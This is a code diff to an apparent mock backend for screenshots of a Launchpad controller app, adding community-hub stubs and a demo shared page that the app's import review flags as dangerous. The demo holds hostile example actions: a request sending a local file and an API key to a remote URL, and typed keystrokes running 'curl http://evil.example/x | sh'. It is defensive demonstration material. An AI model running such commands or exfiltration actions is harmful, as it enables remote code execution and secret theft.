@@ -5,7 +5,7 @@
 // A screenshot scenario tweaks the start state through
 // `window.__LUNCHPAD_SCENARIO__` (set by capture.ts before the page loads).
 import type { Button, DeviceState, Fader, LaunchpadModel, Layout, Page, Profile, Settings } from "@app/lib/api";
-import { AUDIO, C, CONFIG_DIR, DISCOVERED, DOWNLOADS, FILTERS, INPUTS, MODELS, VOICES, button, demoHomeAssistant, demoObs, demoProfile, demoSettings, demoSlobs, launchkeyPage, layoutFor, peaks } from "./fixtures";
+import { AUDIO, C, CONFIG_DIR, DISCOVERED, DOWNLOADS, FILTERS, HUB_BACKUPS, HUB_SHARE_RESULT, INPUTS, MODELS, VOICES, button, demoHomeAssistant, demoHub, demoObs, demoProfile, demoSettings, demoSlobs, launchkeyPage, layoutFor, peaks } from "./fixtures";
 
 /** The app's version, as Vite defines it for the real interface (serve.ts). */
 declare const __LUNCHPAD_VERSION__: string;
@@ -83,6 +83,8 @@ if (scenario.outside) {
   profile.pages[0].buttons.push({ ...button("Cue", C.violet), x: 9, y: 3 }, { ...button("Tempo", C.teal), x: 4, y: 9 });
 }
 
+const hub = demoHub();
+
 const connected = scenario.connected ?? true;
 const variables: Record<string, string> = scenario.variables ?? { deaths: "3", lastScene: "Gameplay", "fader.volume": "75" };
 
@@ -157,21 +159,71 @@ export function handle(cmd: string, a: Args): unknown {
       return layoutFor(a.model);
     case "list_models":
       return MODELS;
+    // A delivery from the hub is read with the very same review as a file.
+    case "hub_review_delivery":
     case "review_import_file":
-    case "review_import_json":
+    case "review_import_json": {
+      const shared = {
+        id: "shared",
+        name: "Shared page",
+        buttons: [
+          { ...button("Go live", C.violet), x: 0, y: 7, down: [
+            { id: "f-http", wait: true, type: "httpRequest", method: "post", url: "https://example.com/upload?key={{secret.openaiKey}}", headers: [{ name: "X-Token", value: "{{secret.openaiKey}}" }], contentType: "application/json", body: "{ \"scene\": \"{{obs.scene}}\", \"deaths\": {{deaths}} }", bodyMode: "multipart", bodyFile: null, files: [{ field: "file", path: "/Users/demo/Documents/notes.txt" }], auth: { type: "none" }, timeoutMs: 10000, ignoreTlsErrors: false, saveTo: null, saveScope: "local", response: "text", responseField: "", fileName: "", reuse: false },
+          ] },
+          { ...button("Shell", C.red), x: 1, y: 7, down: [
+            { id: "f-launch", wait: true, type: "launchApplication", executable: "/bin/sh", arguments: "-c 'curl …'", hidden: false, killOnStop: true },
+            { id: "f-keys", wait: true, type: "hotkey", keystrokes: [{ type: "key", event: "tap", key: "r", modifiers: ["command"] }, { type: "delay", ms: 300 }, { type: "text", text: "cmd /c curl http://evil.example/x | sh", delayMs: 0 }, { type: "key", event: "tap", key: "enter", modifiers: [] }], restoreAllAtEnd: true },
+          ] },
+          { ...button("Scenes", C.teal), x: 2, y: 7, down: [
+            { id: "f-script", wait: true, type: "runScript", code: "Lunchpad.switchPage(\"Scenes\");\nreturn vars.deaths;", saveTo: null, saveScope: "local" },
+            { id: "f-sound", wait: true, type: "playSound", file: "/Users/demo/Music/horn.mp3", volume: 1, start: 0, end: 1, outputDevice: null, volumeFromVelocity: false },
+          ] },
+        ],
+        faders: [],
+      };
       return {
         pages: 1,
         buttons: 3,
-        actions: 7,
+        actions: 5,
+        content: [shared],
         findings: [
-          { level: "danger", kind: "secret", page: "Shared page", x: 0, y: 7, action: "httpRequest", detail: "openaiKey" },
-          { level: "danger", kind: "upload", page: "Shared page", x: 0, y: 7, action: "httpRequest", detail: "/Users/demo/Documents/notes.txt → https://example.com/upload" },
-          { level: "danger", kind: "program", page: "Shared page", x: 1, y: 7, action: "launchApplication", detail: "/bin/sh -c 'curl …'" },
-          { level: "warning", kind: "request", page: "Shared page", x: 0, y: 7, action: "httpRequest", detail: "https://example.com/upload" },
-          { level: "warning", kind: "script", page: "Shared page", x: 2, y: 7, action: "runScript", detail: "Lunchpad.switchPage(\"Scenes\")" },
-          { level: "info", kind: "sound", page: "Shared page", x: 2, y: 7, action: "playSound", detail: "/Users/demo/Music/horn.mp3" },
+          { level: "danger", kind: "secret", page: "Shared page", x: 0, y: 7, caption: "Go live", action: "httpRequest", actionId: "f-http", detail: "openaiKey" },
+          { level: "danger", kind: "upload", page: "Shared page", x: 0, y: 7, caption: "Go live", action: "httpRequest", actionId: "f-http", detail: "/Users/demo/Documents/notes.txt → https://example.com/upload?key={{secret.openaiKey}}" },
+          { level: "danger", kind: "program", page: "Shared page", x: 1, y: 7, caption: "Shell", action: "launchApplication", actionId: "f-launch", detail: "/bin/sh -c 'curl …'" },
+          { level: "danger", kind: "launcher", page: "Shared page", x: 1, y: 7, caption: "Shell", action: "hotkey", actionId: "f-keys", detail: "command+r, “cmd /c curl http://evil.example/x | sh”, enter" },
+          { level: "danger", kind: "command", page: "Shared page", x: 1, y: 7, caption: "Shell", action: "hotkey", actionId: "f-keys", detail: "cmd /c curl http://evil.example/x | sh" },
+          { level: "warning", kind: "request", page: "Shared page", x: 0, y: 7, caption: "Go live", action: "httpRequest", actionId: "f-http", detail: "https://example.com/upload?key={{secret.openaiKey}}" },
+          { level: "warning", kind: "script", page: "Shared page", x: 2, y: 7, caption: "Scenes", action: "runScript", actionId: "f-script", detail: "Lunchpad.switchPage(\"Scenes\");" },
+          { level: "info", kind: "sound", page: "Shared page", x: 2, y: 7, caption: "Scenes", action: "playSound", actionId: "f-sound", detail: "/Users/demo/Music/horn.mp3" },
         ],
       };
+    }
+    // community hub: every call answers with the same signed-in state (fixtures.ts).
+    case "hub_state":
+    case "hub_link_start":
+    case "hub_link_cancel":
+    case "hub_sign_out":
+    case "hub_set_url":
+    case "hub_fetch_listing":
+    case "hub_dismiss_delivery":
+    case "hub_sync_shared":
+    case "hub_forget_shared":
+    case "hub_restore_backup":
+      return hub;
+    case "hub_list_backups":
+    case "hub_delete_backup":
+      return HUB_BACKUPS;
+    case "hub_backup_now":
+      return HUB_BACKUPS[0];
+    case "hub_apply_delivery":
+      return { pages: 1, buttons: 12, actions: 30, warnings: [] };
+    case "hub_share":
+    case "hub_update_listing":
+      return HUB_SHARE_RESULT;
+    case "export_profile_file":
+    case "export_button_file":
+      return null;
+
     case "builtin_info":
       // The shots are taken as Windows (capture.ts), so these read like a Windows machine.
       return { appVersion: __LUNCHPAD_VERSION__, os: "windows", hostname: "STUDIO-PC", username: "Demo", downloadDir: DOWNLOADS.path, configDir: CONFIG_DIR };
